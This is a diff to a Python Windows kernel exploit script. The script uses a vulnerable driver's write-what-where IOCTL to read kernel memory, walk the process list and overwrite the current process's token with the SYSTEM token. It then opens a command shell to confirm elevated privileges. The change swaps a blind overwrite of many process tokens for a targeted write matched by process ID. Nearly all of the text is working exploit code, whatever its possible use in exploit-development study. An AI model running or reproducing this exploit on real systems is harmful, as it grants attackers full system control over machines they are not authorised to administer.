@@ -1,5 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
+
 import ctypes
 import struct
 import sys
@@ -93,6 +94,7 @@ if dwStatus != STATUS_SUCCESS:
     print ('Something went wrong while allocating memory', 'e')
     sys.exit()
 
+
 ########################################## KERNEL BASE ################################################
 
 def getkernelBase(driver):
@@ -147,6 +149,7 @@ def getkernelBase(driver):
             return (img_name, long(kernel_base, 0))
     counter += sizeof(tmp)
 
+
 ########################################### CALCULATE OFFSETS FROM KERNEL #############################################
 
 def get_PsISP_kernel_address(driver, kernel_base, img_name):
@@ -158,6 +161,8 @@ def get_PsISP_kernel_address(driver, kernel_base, img_name):
     # Load kernel image in userland and get PsInitialSystemProcess offset
     kernel_handle = kernel32.LoadLibraryA(img_name)
     print '[+] Loading %s in Userland' % img_name
+
+    # print("[+] %s Userland Base Address : 0x%X" % (kernel_base, kernel_handle))
     PsISP_User_Address = kernel32.GetProcAddress(kernel_handle, 'PsInitialSystemProcess')
     print '[+] PsInitialSystemProcess Userland Base Address: 0x%X' % PsISP_User_Address
 
@@ -170,6 +175,7 @@ def get_PsISP_kernel_address(driver, kernel_base, img_name):
     system_EPROCESS_struct_ptr = readValueatAddress(driver, ptr_to_system_EPROCESS_struct_ptr, USER_MEM_PAGE_PTR)
     
     print "getPsISP_kernel_address Method found system_proc_struct_base_addr as: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
+
     system_EPROCESS_struct_ptr = cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
 
     return long(system_EPROCESS_struct_ptr)
@@ -180,10 +186,10 @@ def writeWhatWhere(driver, system_token_value, where):
     
     # Write the what value to WRITE_TARGET_ADDR
     data = struct.pack("<Q", system_token_value)
-    print "Write what: " + hex(system_token_value)
+    #print "Write what: " + hex(system_token_value)
     dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR_OFFSET, data, len(data), byref(written))
     
-    print "What buffer contains: %08x" % cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
+    #print "What buffer contains: %08x" % cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
 
     if dwStatus == 0:
         print("Something went wrong while writing to memory","e")
@@ -206,7 +212,7 @@ def writeWhatWhere(driver, system_token_value, where):
     lpBytesReturned = byref(dwBytesReturned)
 
     triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
-    print "Our memory target is: " + str(hex(where))
+    #print "Our memory target is: " + str(hex(where))
     return triggerIOCTL
 
 ################################################### KERNEL WRITE FUNCTION ###########################################################
@@ -302,29 +308,34 @@ def executeOverwrite():
         flink = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
         
         while True:
-            
-            print "Flink is: " + hex(flink)
+            PID_OFFSET = 0x2e0
+
             flinkEPROCESS = flink - ACTIVE_PROC_LINK_OFFSET
-            print "FlinkEPROCESS (flink-2e8) is: " + hex(flinkEPROCESS)
 
             nextEPROCESSflink = flinkEPROCESS + ACTIVE_PROC_LINK_OFFSET
-            print "nextFlink is: " + hex(flinkEPROCESS + ACTIVE_PROC_LINK_OFFSET)
-
             deref_ptr_nextEPROCESS = readValueatAddress(driver, nextEPROCESSflink, USER_ADDR_OFFSET)
+            
             nextflink = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
-            print "That pointer points to nextFlink: " + hex(nextflink)
 
-            where = flinkEPROCESS+TOKEN_OFFSET
-            print "Writing to: " + hex(where)
-            writeWhatWhere(driver, system_token_value, where)
+            currentPIDptr = c_ulonglong(0)
 
-            flink = nextflink
+            myPID = os.getpid()
+            print "Searching for process ID: " + str(myPID)
+            currentPIDptr = flinkEPROCESS + PID_OFFSET
+            currentPIDuser = readValueatAddress(driver, currentPIDptr, USER_ADDR_OFFSET)
+            currentPID = cast(USER_ADDR_OFFSET, POINTER(c_ulonglong))[0]
 
+            print "Read current PID as: " + str(currentPID)
 
-            total_writes += 1
-
-            if total_writes >200:
+            
+            where = flinkEPROCESS + TOKEN_OFFSET
+            if myPID == currentPID:
+                print "Found our PID; Writing: " + hex(system_token_value) + " at address: " + hex(where)
+                writeWhatWhere(driver, system_token_value, where)
+                os.system('cmd /k "echo "whoami?" & whoami"')
                 break
+            
+            flink = nextflink
 
 ############################################ RUN ################################################
 
